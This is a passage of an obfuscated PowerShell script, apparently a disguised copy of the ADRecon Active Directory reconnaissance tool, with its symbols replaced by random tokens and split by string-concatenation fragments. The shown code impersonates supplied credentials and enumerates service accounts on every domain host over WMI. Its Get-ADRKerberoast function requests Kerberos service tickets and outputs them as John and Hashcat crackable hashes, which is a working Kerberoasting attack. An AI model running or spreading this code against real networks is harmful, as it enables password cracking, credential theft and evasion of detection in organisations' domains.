    }

    If (5I7ELDACLObj)
    {
        Export-ADR 5I7ELDACLObj 5I7ELADROutputDir 5I7ELOutputType I2ajDACLsI2aj
        Remove-Variable DACLObj
    }

    If (5I7ELSACLObj)
    {
        Export-ADR 5I7ELSACLObj 5I7ELADROutputDir 5I7ELOutputType I2ajSACLsI2aj
        Remove-Variable SACLObj
    }
}

Function Get-ADRGPOReport
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELtrue)]
        [bool] 5I7ELUseAltCreds,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELADROutputDir
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            
            5I7ELSaveVerbosePreference = 5I7ELscript:VerbosePreference
            5I7ELscript:VerbosePreference = JQTOySilentlyContinueJQTOy
         '+'   Import-Module GroupPolicy -WarningAction Stop -ErrorAction Stop Ok6rl Out-Null
            If (5I7ELSaveVerbosePreference)
            {
                5I7ELscript:VerbosePreference = 5I7ELSaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGPOReport] Error importing the GroupPolicy Module. Skipping GPOReportI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            If (5I7ELSaveVerbosePreference)
            {
                5I7ELscript:VerbosePrefere'+'nce = 5I7ELSaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
            Return 5I7ELnull
        }
        Try
        {
            Write-Verbose I2aj[*] GPOReport XMLI2aj
            5I7ELADFileName = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyGPO-ReportJQTOy,JQTOy.xmlJQTOy)
            Get-GPOReport -All -ReportType XML -Path 5I7ELADFileName
        }
        Catch
        {
            If (5I7ELUseAltCreds)
            {
                Write-Warning I2aj[*] Run the tool using RUNAS.I2aj
                Write-Warning I2aj[*] runas /user:<Domain FQDN>COlhg<Username> /netonly powershell.exeI2aj
                Return 5I7ELnull
            }
            Write-Warning I2aj[Get-ADRGPOReport] Error getting the GPOReport in XMLI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
        Try
        {
            Write-Verbose I2aj[*] GPOReport HTMLI2aj
            5I7ELADFileName = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyGPO-ReportJQTOy,JQTOy.htmlJQTOy)
            Get-GPOReport -All -ReportType HTML -Path 5I7ELADFileName
        }
        Catch
        {
            If (5I7ELUseAltCreds)
            {
                Write-Warning I2aj[*] Run the tool using RUNAS.I2aj
                Write-Warning I2aj[*] runas /user:<Domain FQDN>COlhg<Username> /netonly powershell.exeI2aj
                Return 5I7ELnull
            }
            Write-Warning I2aj[Get-ADRGPOReport] Error getting the GPOReport in XMLI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
    }
    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        Write-Warning I2aj[*] Currently, the module is only supported with ADWS.I2aj
    }
}


Function Get-ADRUserImpersonation
{


    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = JQTOyCredentialJQTOy)]
    Param(
        [Parameter(Mandatory = 5I7ELTrue, ParameterSetName = JQTOyCredentialJQTOy)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        5I7ELCredential,

        [Parameter(Mandatory = 5I7ELTrue, ParameterSetName = JQTOyTokenHandleJQTOy)]
        [ValidateNotNull()]
        [IntPtr]
        5I7ELTokenHandle,

        [Switch]
        5I7ELQuiet
    )

    If (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne JQTOySTAJQTOy) -and (-not 5I7ELPSBoundParameters[JQTOyQuietJQTOy]))
    {
        Write-Warning I2aj[Get-ADRUserImpersonation] powershell.exe i'+'s not currently in a single-threaded apartment state, token impersonation may not work.I2aj
    }

    If (5I7ELPSBoundParameters[JQTOyTokenHandleJQTOy])
    {
        5I7ELLogonTokenHandle = 5I7ELTokenHandle
    }
    Else
    {
        5I7ELLogonTokenHandle = [IntPtr]::Zero
        5I7ELNetworkCredential = 5I7ELCredential.GetNetworkCredential()
        5I7ELUserDomain = 5I7ELNetworkCredential.Domain
        If (-No'+'t 5I7ELUserDomain)
        {
            Write-Warning I2aj[Get-ADRUserImpersonation] Use credential with Domain FQDN. (<Domain FQDN>COlhg<Username>)I2aj
        }
        5I7ELUserName = 5I7ELNetworkCredential.UserName
        Write-Warning I2aj[Get-ADRUserImpersonation] Executing LogonUser() with user: 5I7EL(5I7ELUserDomain)COlhg5I7EL(5I7ELUserName)I2aj

        
        
        5I7ELResult = 5I7ELAdvapi32::LogonUser(5I7ELUserName, 5I7ELUserDomain, 5I7ELNetworkCredential.Password, 9, 3, [ref]5I7ELLogonTokenHandle)
        5I7ELLastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        If (-not 5I7ELResult)
        {
            throw I2aj[Get-ADRUserImpersonation] LogonUser() Error: 5I7EL(([ComponentModel.Win32Exception] 5I7ELLastError).Message)I2aj
        }
    }

    
    5I7ELResult = 5I7ELAdvapi32::ImpersonateLoggedOnUser(5I7ELLogonTokenHandle)

    If (-not 5I7ELResult)
    {
        throw I2aj[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: 5I7EL(([ComponentModel.Win32Exception] 5I7ELLastError).Message)I2aj
    }

    Write-Verbose I2aj[Get-ADR-UserImpersonation] Alternate credentials successfully impersonatedI2aj
    5I7ELLogonTokenHandle
}


Function Get-ADRRevertToSelf
{


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        5I7ELTokenHandle
    )

    If (5I7ELPSBoundParameters[JQTOyTokenHandleJQTOy])
    {
        Write-Warning I2aj[Get-ADRRevertToSelf] Reverting token impersonation and closing LogonUser() token handleI2aj
        5I7ELResult = 5I7ELKernel32::CloseHandle(5I7ELTokenHandle)
    }

    5I7ELResult = 5I7ELAdvapi32::RevertToSelf()
    5I7ELLastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    If (-not 5I7ELResult)
    {
        Write-Error I2aj[Get-ADRRevertToSelf] RevertToSelf() Error: 5I7EL(([ComponentModel.Win32Exception] 5I7ELLastError).Message)I2aj
    }

    Write-Verbose I2aj[Get-ADRRevertToSelf] Token impersonation successfully revertedI2aj
}


Function Get-ADRSPNTicket
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELUserSPN
    )

    Try
    {
        5I7ELNull = [Reflection.Assembly]::LoadWithPartialName(JQTOySystem.IdentityModelJQTOy)
        5I7ELTicket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 5I7ELUserSPN
    }
    Catch
    {
        Write-Warning I2aj[Get-ADRSPNTicket] Error requesting ticket for SPN 5I7ELUserSPNI2aj
        Write-Warning I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        Return 5I7ELnull
    }

    If (5I7ELTicket)
    {
        5I7ELTicketByteStream = 5I7ELTicket.GetRequest()
    }

    If (5I7ELTicketByteStream)
    {
        5I7ELTicketHexStream = [System.BitConverter]::ToString(5I7ELTicketByteStream) -replace JQTOy-JQTOy

        
        
        If (5I7ELTicketHexStream -match JQTOya382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)JQTOy)
        {
            5I7ELEtype = [Convert]::ToByte( 5I7ELMatches.EtypeLen, 16 )
            5I7ELCipherTextLen = [Convert]::ToUInt32(5I7ELMatches.CipherTextLen, 16)-4
            5I7ELCipherText = 5I7ELMatches.DataToEnd.Substring(0,5I7ELCipherTextLen*2)

            
            If (5I7ELMatches.DataToEnd.Substring(5I7ELCipherTextLen*2, 4) -ne JQTOyA482JQTOy)
            {
                Write-Warning JQTOy[Get-ADRSPNTicket] Error parsing ciphertext for the SPN  5I7EL(5I7ELTicket.ServicePrincipalName).JQTOy 
                5I7ELHash = 5I7ELnull
            }
            Else
            {
                5I7ELHash = I2aj5I7EL(5I7ELCipherText.Substring(0,32))FKhAJ5I7EL5I7EL(5I7ELCipherText.Substring(32))I2aj
            }
        }
        Else
        {
            Write-Warning I2aj[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  5I7EL(5I7ELTicket.ServicePrincipalName).I2aj 
            5I7ELHash = 5I7ELnull
        }
    }
    5I7ELObj = New-Object PSObject
    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajServicePrincipalNameI2aj -Value 5I7ELTicket.ServicePrincipalName
    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajEtypeI2aj -Value 5I7ELEtype
    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajHashI2aj -Value 5I7ELHash
    Return 5I7ELObj
}

Function Get-ADRKerberoast
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize
    )

    If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
    {
        5I7ELLogonToken = Get-ADRUserImpersonation -Credential 5I7ELCredential
    }

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADUsers = Get-ADObject -LDAPFilter I2aj(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))I2aj -Properties sAMAccountName,servicePrincipalName,DistinguishedName -ResultPageSize 5I7ELPageSize
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRKerberoast] Error while enumerating UserSPN ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADUsers)
        {
            5I7ELUserSPNObj = @()
            5I7ELADUsers Ok6rl ForEach-Object {
                ForEach (5I7ELUserSPN in 5I7EL_.servicePrincipalName)
                {
                    5I7ELObj = New-Object PSObject
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajUsernameI2aj -Value 5I7EL_.sAMAccountName
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajServicePrincipalNameI2aj -Value 5I7ELUserSPN

                    5I7ELHashObj = Get-ADRSPNTicket 5I7ELUserSPN
                    If (5I7ELHashObj)
                    {
                        5I7ELUserDomain = 5I7EL_.DistinguishedName.SubString(5I7EL_.DistinguishedName.IndexOf(JQTOyDC=JQTOy)) -replace JQTOyDC=JQTOy,JQTOyJQTOy -replace JQTOy,JQTOy,JQTOy.JQTOy
                        
               '+'         5I7ELJTRHash = I2ajFKhAJ5I7ELkrb5tgsFKhAJ5I7EL5I7EL(5I7ELHashObj.ServicePrincipalName):5I7EL(5I7ELHashObj.Hash)I2aj
                        
                        5I7ELHashcatHash = I2ajFKhAJ5I7ELkrb5tgsFKhAJ5I7EL5I7EL(5I7ELHashObj.Etype)FKhAJ5I7EL*5I7EL(5I7EL_.SamAccountName)FKhAJ5I7EL5I7ELUserDomainFKhAJ5I7EL5I7EL(5I7ELHashObj.ServicePrincipalName)*FKhAJ5I7EL5I7EL(5I7ELHashObj.Hash)I2aj
                    }
                    Else
                    {
                        5I7ELJTRHash = 5I7ELnull
                        5I7ELHashcatHash = 5I7ELnull
                    }
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajJohnI2aj -Value 5I7ELJTRHash
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajHashcatI2aj -Value 5I7ELHashcatHash
                    5I7ELUserSPNObj += 5I7ELObj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdistinguishednameI2aj,I2ajsamaccountnameI2aj,I2ajserviceprincipalnameI2aj,I2ajuseraccountcontrolI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj
        Try
        {
            5I7ELADUsers = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRKerberoast] Error while enumerating UserSPN ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADUsers)
        {
            5I7ELUserSPNObj = @()
            5I7ELADUsers Ok6rl ForEach-Object {
                ForEach (5I7ELUserSPN in 5I7EL_.Properties.serviceprincipalname)
                {
                    5I7ELObj = New-Object PSObject
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajUsernameI2aj -Value 5I7EL_.Properties.samaccountname[0]
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajServicePrincipalNameI2aj -Value 5I7ELUserSPN

                    5I7ELHashObj = Get-ADRSPNTicket 5I7ELUserSPN
                    If (5I7ELHashObj)
                    {
                        5I7ELUserDomain = 5I7EL_.Properties.distinguishedname[0].SubString(5I7EL_.Properties.distinguishedname[0].IndexOf(JQTOyDC=JQTOy)) -replace JQTOyDC=JQTOy,JQTOyJQTOy -replace JQTOy,JQTOy,JQTOy.JQTOy
                        
                        5I7ELJTRHash = I2ajFKhAJ5I7ELkrb5tgsFKhAJ5I7EL5I7EL(5I7ELHashObj.ServicePrincipalName):5I7EL(5I7ELHashObj.Hash)I2aj
                        
                        5I7ELHashcatHash = I2ajFKhAJ5I7ELkrb5tgsFKhAJ5I7EL5I7EL(5I7ELHashObj.Etype)FKhAJ5I7EL*5I7EL(5I7EL_.Properties.samaccountname)FKhAJ5I7EL5I7ELUserDomainFKhAJ5I7EL5I7EL(5I7ELHashObj.ServicePrincipalName)*FKhAJ5I7EL5I7EL(5I7ELHashObj.Hash)I2aj
                    }
                    Else
                    {
                        5I7ELJTRHash = 5I7ELnull
                        5I7ELHashcatHash = 5I7ELnull
                    }
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajJohnI2aj -Value 5I7ELJTRHash
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajHashcatI2aj -Value 5I7ELHashcatHash
                    5I7ELUserSPNObj += 5I7ELObj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If (5I7ELLogonToken)
    {
        Get-ADRRevertToSelf -TokenHandle 5I7ELLogonToken
    }

    If (5I7ELUserSPNObj)
    {
        Return 5I7ELUserSPNObj
    }
    Else
    {
        Return 5I7ELnull
    }
}


Function Get-ADRDomainAccountsusedforServiceLogon
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10
    )

    BEGIN {
        5I7ELreadServiceAccounts = [scriptblock] {
            
            5I7ELhostname = [string] 5I7ELargs[0]
            5I7'+'ELOperatingSystem = [string] 5I7ELargs[1]
            
            5I7ELCredential = 5I7ELargs[2]
            5I7ELtimeout = 250
            5I7ELport = 135
            Try
            {
                5I7ELtcpclient = New-Object System.Net.Sockets.TcpClient
                5I7ELresult = 5I7ELtcpclient.BeginConnect(5I7ELhostname,5I7ELport,5I7ELnull,5I7ELnull)
                5I7ELsuccess = 5I7ELresult.AsyncWaitHandle.WaitOne(5I7ELtimeout,5I7ELnull)
            }
            Catch
            {
                5I7ELwarning = I2aj5I7ELhostname (5I7ELOperatingSystem) is unreachable 5I7EL(5I7EL_.Exception.Message)I2aj
                5I7ELsuccess = 5I7ELfalse
                5I7ELtcpclient.Close()
            }
            If (5I7ELsuccess)
            {
                
                If (5I7ELPSVersionTable.PSVersion.Major -ne 2)
                {
                    If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        5I7ELsession = New-CimSession -ComputerName 5I7ELhostname -SessionOption 5I7EL(New-CimSessionOption -Protocol DCOM) -Credential 5I7ELCredential
                        If (5I7ELsession)
                        {
                            5I7ELserviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession 5I7ELsession -ErrorAction Stop)
                        }
                    }
                    Else
                    {
                        5I7ELsession = New-CimSe'+'ssion -ComputerName 5I7ELhostname -SessionOption 5I7EL(New-CimSessionOption -Protocol DCOM)
                        If (5I7ELsession)
                        {
                            5I7ELserviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession 5I7ELsession -ErrorAction Stop )
                        }
                    }
                }
                Else
                {
                    If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        5I7ELserviceList = @( Get-WmiObject -Class Win32_Service -ComputerName 5I7ELhostname -Credential 5I7ELCredential -Impersonation 3 -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                    Else
                    {
                        5I7ELserviceList = @( Get-WmiObject -Class Win32_Service -Comp'+'uterName 5I7ELhostname -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                }
                5I7ELserviceList
            }
            Try
            {
                If (5I7ELtcpclient) { 5I7ELtcpclient.EndConnect(5I7ELresult) Ok6rl Out-Null }
            }
            Catch
            {
                5I7ELwarning = I2aj5I7ELhostname (5I7ELOperatingSystem) : 5I7EL(5I7EL_.Exception.Message)I2aj
            }
            5I7ELwarning
        }

        Function processCompletedJobs()
        {
            
            

            5I7ELjobs = Get-Job -State Completed
            ForEach( 5I7ELjob in 5I7ELjobs )
            {
                If (5I7ELnull -ne 5I7ELjob)
                {
                    5I7ELdata = Receive-Job 5I7ELjob
                    Remove-Job '+'5I7ELjob
                }

                If (5I7ELdata)
                {
                    If ( 5I7ELdata.GetType() -eq [Object[]] )
                    {
                        5I7ELserviceList = 5I7ELdata Ok6rl Where-Object { if (5I7EL_.StartName) { 5I7EL_ }}
                        5I7ELserviceList Ok6rl ForEach-Object {
                            5I7ELObj = New-Object PSObject
                            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajAccountI2aj -Value 5I7EL_.StartName
                            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajService NameI2aj -Value 5I7EL_.Name
                            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajSystemNameI2aj -Value 5I7EL_.SystemName
                            If (5I7EL_.StartName.toUpper().Contains(5I7ELcurrentDomain))
                            {
                                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajRunning as Domain UserI2aj -Value 5I7ELtrue
                            }
                            Else
                            {
                                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajRunning as Domain UserI2aj -Value 5I7ELfalse
                            }
                           '+' 5I7ELscript:serviceAccounts += 5I7ELObj
                        }
                    }
                    ElseIf ( 5I7ELdata.GetType() -eq [String] )
                    {
                        5I7ELscript:warnings += 5I7ELdata
                        Write-Verbose 5I7ELdata
                    }
                }
            }
        }
    }

    PROCESS
    {
        5I7ELscript:serviceAccounts = @()
        [string[]] 5I7ELwarnings = @()
        If (5I7ELMethod -eq JQTOyADWSJQTOy)
        {
            Try
            {
                5I7ELADDomain = Get-ADDomain
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomainAccountsusedforServiceLogon] Error getting Domain ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            If (5I7ELADDomain)
            {
                5I7ELcurrentDomain = 5I7ELADDomain.NetBIOSName.toUpper()
                Remove-Variable ADDomain
            }
            Else
            {
                5I7ELcurrentDomain = I2ajI2aj
                Write-Warning I2ajCurrent Domain could not be retrieved.I2aj
            }

            Try
            {
                5I7ELADComputers = Get-ADComputer -Filter { Enabled -eq 5I7ELtrue -and OperatingSystem -Like I2aj*Windows*I2aj } -Properties Name,DNSHostName,OperatingSystem
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomainAccountsusedforServiceLogon] Error while enumerating Windows Computer ObjectsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }

            If (5I7ELADComputers)
            {
                
                
                5I7ELcnt = 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADComputers))
                Write-Verbose I2aj[*] Total Windows Hosts: 5I7ELcntI2aj
                5I7ELicnt = 0
                5I7ELADComputers Ok6rl ForEach-Object {
                    5I7ELStopWatch = [System.Diagnostics.StopWatch]::StartNew()
                    If( 5I7EL_.dnshostname )
	                {
                        5I7ELargs = @(5I7EL_.DNSHostName, 5I7EL_.OperatingSystem, 5I7ELCredential)
		                Start-Job -ScriptBlock 5I7ELreadServiceAccounts -Name I2ajread_5I7EL(5I7EL_.name)I2aj -ArgumentList 5I7ELargs Ok6rl Out-Null
		                ++5I7ELicnt
		                If (5I7ELStopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
                            Write-Progress -Activity I2ajRetrieving data from serversI2aj -Status I2aj5I7EL(I2aj{0:N2}I2aj -f ((5I7ELicnt/5I7ELcnt*100),2)) % Complete:I2aj -PercentComplete 100
                            5I7ELStopWatch.Reset()
                            5I7ELStopWatch.Start()
		                }
                        while ( ( Get-Job -State Running).count -ge 5I7ELThreads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                

            '+'    Write-Progress -Activity I2ajRetrieving data from serversI2aj -Status I2ajWaiting for background jobs to complete...I2aj -PercentComplete 100
                Wait-Job -State Running -Timeout 30  Ok6rl Out-Null
                Get-Job -State Running Ok6rl Stop-Job
                processCompletedJobs
                Write-Progress -Activity I2ajRetrieving data from serversI2aj -Completed -'+'Status I2ajAll DoneI2aj
            }
        }

        If (5I7ELMethod -eq JQTOyLDAPJQTOy)
        {
            5I7ELcurrentDomain = ([string](5I7ELobjDomain.name)).toUpper()

            5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
            5I7ELObjSearcher.PageSize = 5I7ELPageSize
            5I7ELObjSearcher.Filter = I2aj(&(samAccountType=805306369)(!userAccountControl:1.2.840.113556.1.4.803:=2)(operatingSystem=*Windows*))I2aj
            5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajnameI2aj,I2ajdnshostnameI2aj,I2ajoperatingsystemI2aj))
            5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

            Try
            {
                5I7ELADComputers = 5I7ELObjSearcher.Find'+'All()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomainAccountsusedforServiceLogon] Error while enumerating Windows Computer ObjectsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            5I7ELObjSearcher.dispose()

            If (5I7ELADComputers)
            {
                
                
                5I7ELcnt = 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADComputers))
                Write-Verbose I2aj[*] Total Windows Hosts: 5I7ELcntI2aj
                5I7ELicnt = 0
                5I7ELADComputers Ok6rl ForEach-Object {
                    If( 5I7EL_.Properties.dnshostname )
	                {
                        5I7ELargs = @(5I7EL_.Properties.dnshostname, 5I7EL_.Properties.operatingsystem, 5I7ELCredential)
		                Start-Job -ScriptBlock 5I7ELreadServiceAccounts -Name I2ajread_5I7EL(5I7EL_.Properties.name)I2aj -ArgumentList 5I7ELargs Ok6rl Out-Null
		                ++5I7ELicnt
		                If (5I7ELStopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
		                    Write-Progress -Activity I2ajRetrieving data from serversI2aj -Status I2aj5I7EL(I2aj{0:N2}I2aj -f ((5I7ELicnt/5I7ELcnt*100),2)) % Complete:I2aj -PercentComplete 100
                            5I7ELStopWatch.Reset()
                            5I7ELStopWatch.Start()
		                }
		                while ( ( Get-Job -State Running).count -ge 5I7ELThreads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                
                Write-Progress -Activity I2ajRetrieving data from serversI2aj -Status I2ajWaiting for background jobs to complete...I2aj -PercentComplete 100
                Wait-Job -State Running -Timeout 30  Ok6rl Out-Null
                Get-Job -State Running Ok6rl Stop-Job
                processCompletedJobs
                Write-Progress -Activity I2ajRetrieving data from serversI2aj -C'+'ompleted -Status I2ajAll DoneI2aj
            }
        }

        If (5I7ELscript:serviceAccounts)
        {
            Return 5I7ELscript:serviceAccounts
        }
        Else
        {
            Return 5I7ELnull
        }
    }
}

Function Remove-EmptyADROutputDir
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELADROutputDir,

        [Parameter(Mandatory = 5I7ELtrue)]
        [array] 5I7ELOutputType
    )

    Switch (5I7ELOutputType)
    {
        JQTOyCSVJQTOy
        {
            5I7ELCSVPath  = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyCSV-Fi'+'lesJQTOy)
            If (!(Test-Path -Path 5I7ELCSVPathCOlhg*))
            {
                Write-Verbose I2ajRemoved Empty Directory 5I7ELCSVPathI2aj
                Remove-Item 5I7ELCSVPath
            }
        }
        JQTOyXMLJQTOy
        {
            5I7ELXMLPath  = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyXML-FilesJQTOy)
            If (!(Test-Path -Path 5I7ELXMLPathCOlhg*))
            {
                Write-Verbose I2ajRemoved Empty Directory 5I7ELXMLPathI2aj
                Remove-Item 5I7ELXMLPath
            }
        }
        JQTOyJSONJQTOy
        {
            5I7ELJSONPath  = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyJSON-FilesJQTOy)
            If (!(Test-Path -Path 5I7ELJSONPathCOlhg*))
            {
                Write-Verbose I2ajRemoved Empty Directory 5I7ELJSONPathI2aj
                Remove-Item 5I7ELJSONPath
            }
        }
        JQTOyHTMLJQTOy
        {
            5I7ELHTMLPath  = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyHTML-FilesJQTOy)
            If (!(Test-Path -Path 5I7ELHTMLPathCOlhg*))
            {
                Write-Verbose I2ajRemoved Empty Directory 5I7ELHTMLPathI2aj
                Remove-Item 5I7ELHTMLPath
            }
        }
    }
    If (!(Test-Path -Path 5I7ELADROutputDirCOlhg*))
    {
        Remove-Item 5I7ELADROutputDir
        Write-Verbose I2ajRemoved Empty Directory 5I7ELADROutputDirI2aj
    }
}

Function Get-ADRAbout
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELtrue)]
        [DateTime] 5I7ELdate,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELADReconVersion,

        [Para'+'meter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELRanonComputer,

        [Parame'+'ter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELTotalTime
    )

    5I7ELAboutADRecon = @()

    5I7ELVersion = 5I7ELMethod + I2aj VersionI2aj

    If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
    {
        5I7ELUsername = 5I7EL(5I7ELCredential.UserName)
    }
    Else
    {
        5I7ELUsername = 5I7EL([Environment]::UserName)
    }

    5I7ELObjValues = @(I2ajDateI2aj, 5I7EL(5I7ELdate), I2ajADReconI2aj, I2ajhttps://github.com/adrecon/ADReconI2aj, 5I7ELVersion, 5I7EL(5I7ELADReconVersion), I2ajRan as userI2aj, 5I7ELUsername, I2ajRan on computerI2aj, 5I7ELRanonComputer, I2ajExecution Time (mins)I2aj, 5I7EL(5I7ELTotalTime))

    For (5I7ELi = 0; 5I7ELi -lt 5I7EL(5I7ELObjValues.Count); 5I7ELi++)
    {
        5I7ELObj = New-Object PSObject
        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value 5I7ELObjValues[5I7ELi]
        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELObjValues[5I7ELi+1]
        5I7ELi++
        5I7ELAboutADRecon += 5I7ELObj
    }
    Return 5I7ELAboutADRecon
}

Function Invoke-ADRecon
{

    param(
        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELGenExcel,

        [Parameter(Mandatory = 5I7ELfalse)]
        [ValidateSet(JQTOyADWSJQTOy, JQTOyLDAPJQTOy)]
        [string] 5I7ELMethod = JQTOyADWSJQTOy,

        [Parameter(Mandatory = 5I7ELtrue)]
        [array] 5I7ELCollect,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainController = JQTOyJQTOy,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = 5I7ELtrue)]
        [array] 5I7ELOutputType,

